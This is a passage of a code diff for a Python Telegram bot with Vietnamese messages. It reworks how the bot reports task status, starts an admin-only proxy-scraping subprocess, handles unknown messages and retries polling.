-            delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+            bot.edit_message_text(
+                "❌ Lệnh không hợp lệ.",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
             return
         key = (user_id, chat_id, task_key)
         proc = running_tasks.get(key)
         if proc and proc.poll() is None:
-            sent = bot.reply_to(message, f"✅ Tác vụ `{task_key}` đang chạy (PID {proc.pid}).")
+            bot.edit_message_text(
+                f"✅ Tác vụ `{task_key}` đang chạy (PID {proc.pid}).",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
         else:
-            sent = bot.reply_to(message, f"ℹ️ Tác vụ `{task_key}` hiện không chạy.")
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+            bot.edit_message_text(
+                f"ℹ️ Tác vụ `{task_key}` hiện không chạy.",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
     except Exception as e:
         logger.error(f"Error checking task status: {e}")
-        sent = bot.reply_to(message, "❌ Lỗi khi kiểm tra trạng thái tác vụ.")
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        try:
+            bot.edit_message_text(f"❌ Lỗi khi kiểm tra trạng thái tác vụ: {str(e)}", 
+                                chat_id=message.chat.id, 
+                                message_id=processing_msg.message_id)
+        except:
+            sent = bot.reply_to(message, f"❌ Lỗi khi kiểm tra trạng thái tác vụ: {str(e)}")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
 @bot.message_handler(commands=['scrapeproxies'])
 @ignore_old_messages
@@ -658,50 +1076,138 @@ def cmd_status_task(message):
 @admin_required
 @log_command
 def cmd_scrapeproxies(message):
+    # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
+    processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /scrapeproxies...")
+    
+    # Xóa tin nhắn lệnh sau khi đã gửi thông báo
+    delete_message_immediately(message.chat.id, message.message_id)
+    
     user_id = message.from_user.id
     chat_id = message.chat.id
     task_key = "scrapeproxies"
     key = (user_id, chat_id, task_key)
     proc = running_tasks.get(key)
     if proc and proc.poll() is None:
-        sent = bot.reply_to(message, "❌ Tác vụ thu thập proxy đang chạy rồi. Vui lòng đợi hoặc dừng rồi chạy lại.")
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        bot.edit_message_text("❌ Tác vụ thu thập proxy đang chạy rồi. Vui lòng đợi hoặc dừng rồi chạy lại.", 
+                            chat_id=message.chat.id, 
+                            message_id=processing_msg.message_id)
+        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
         return
     try:
-        proc = subprocess.Popen(
-            ['python3', 'scrape.py'],  # Đổi tên file nếu bạn đặt khác
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            preexec_fn=os.setsid
-        )
+        # Use different approach for Windows vs Unix
+        if os.name == 'nt':  # Windows
+            proc = subprocess.Popen(
+                ['python', 'scrape.py'],  # Use 'python' instead of 'python3' on Windows
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP
+            )
+        else:  # Unix/Linux
+            proc = subprocess.Popen(
+                ['python3', 'scrape.py'],  # Đổi tên file nếu bạn đặt khác
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                preexec_fn=os.setsid
+            )
         running_tasks[key] = proc
-        sent = bot.reply_to(message, "✅ Đã bắt đầu thu thập proxy. Vui lòng đợi...")
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        
+        # Cập nhật thông báo thành công
+        bot.edit_message_text(
+            "✅ Lệnh /scrapeproxies đã được nhận!\n"
+            "🔄 Đang bắt đầu thu thập proxy từ các nguồn...\n"
+            "⏳ Quá trình này có thể mất vài phút.\n"
+            "📁 Kết quả sẽ được lưu vào file proxies.txt",
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+        
+        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=30)
     except Exception as e:
         logger.error(f"Error starting scrapeproxies task: {e}")
-        sent = bot.reply_to(message, f"❌ Lỗi khi bắt đầu thu thập proxy: {e}")
-        delete_messages_later(message.chat.id, [message.message_id, sent.message_id])
+        bot.edit_message_text(f"❌ Lỗi khi bắt đầu thu thập proxy: {str(e)}", 
+                            chat_id=message.chat.id, 
+                            message_id=processing_msg.message_id)
+        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+
+# ========== Handler cho tin nhắn không được nhận diện ==========
+
+@bot.message_handler(func=lambda message: True)
+@ignore_old_messages
+@not_banned
+def handle_unknown_message(message):
+    """Xử lý các tin nhắn không được nhận diện"""
+    try:
+        # Kiểm tra nếu là lệnh không tồn tại
+        if message.text.startswith('/'):
+            sent = bot.reply_to(message, 
+                f"❓ Lệnh `{message.text.split()[0]}` không tồn tại hoặc bạn không có quyền sử dụng.\n"
+                f"💡 Sử dụng /help để xem danh sách lệnh có sẵn.")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+        else:
+            # Tin nhắn thường
+            sent = bot.reply_to(message, 
+                "💬 Bot chỉ hỗ trợ các lệnh. Sử dụng /help để xem danh sách lệnh có sẵn.")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=8)
+    except Exception as e:
+        logger.error(f"Error handling unknown message: {e}")
 
 # ========== Main chạy bot ==========
 
 def main():
     bot.start_time = datetime.now()
     logger.info(f"🤖 Bot khởi động với token bắt đầu bằng: {Config.TOKEN[:10]}")
-    while True:
+    
+    # Kiểm tra dependencies
+    check_dependencies()
+    
+    # Kiểm tra token hợp lệ
+    try:
+        bot_info = bot.get_me()
+        logger.info(f"✅ Bot connected successfully: @{bot_info.username}")
+    except Exception as e:
+        logger.error(f"❌ Invalid bot token or connection failed: {e}")
+        sys.exit(1)
+    
+    retry_count = 0
+    max_retries = 5
+    
+    while retry_count < max_retries:
         try:
+            logger.info("🔄 Starting bot polling...")
             bot.infinity_polling(timeout=60, long_polling_timeout=60)
+            break  # Nếu polling thành công, thoát khỏi vòng lặp
         except ApiException as api_e:
-            logger.error(f"Lỗi Telegram API: {api_e}")
+            retry_count += 1
+            logger.error(f"❌ Telegram API Error (attempt {retry_count}/{max_retries}): {api_e}")
+            if retry_count >= max_retries:
+                logger.error("❌ Max retries reached. Exiting...")
+                break
             time.sleep(Config.RETRY_DELAY)
+        except KeyboardInterrupt:
+            logger.info("🛑 Bot stopped by user (KeyboardInterrupt)")
+            break
         except Exception as e:
-            logger.error(f"Lỗi bot: {e}")
+            retry_count += 1
+            logger.error(f"❌ Unexpected error (attempt {retry_count}/{max_retries}): {e}")
+            if retry_count >= max_retries:
+                logger.error("❌ Max retries reached. Exiting...")
+                break
             time.sleep(Config.RETRY_DELAY)
-        finally:
-            logger.info(f"Khởi động lại bot sau {Config.RETRY_DELAY} giây...")
+    
+    logger.info("👋 Bot shutdown complete")
 
 if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        logger.info("Bot đã bị dừng bằng KeyboardInterrupt")
+        logger.info("🛑 Bot stopped by user (KeyboardInterrupt)")
+    except Exception as e:
+        logger.error(f"❌ Fatal error: {e}")
+    finally:
+        # Cleanup
+        try:
+            executor.shutdown(wait=False)
+            logger.info("🧹 Cleanup completed")
+        except:
+            pass
         sys.exit(0)
